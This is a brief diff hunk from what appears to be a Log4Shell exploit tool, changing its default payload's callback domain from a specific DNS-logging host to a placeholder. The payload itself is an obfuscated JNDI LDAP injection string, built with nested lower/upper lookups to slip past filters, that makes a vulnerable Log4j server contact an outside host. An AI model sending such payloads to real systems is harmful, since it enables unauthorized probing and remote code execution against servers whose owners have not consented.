@@ -26,5 +26,5 @@ Exploit Options:
 '''
 
 default_payload = '${${lower:${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${' \
-                  'lower:p}://payload_id.pp.ns.cmbdnslog.biz/status}} '
+                  'lower:p}://payload_id.pp.ns.dnslog.domain/status}} '
 
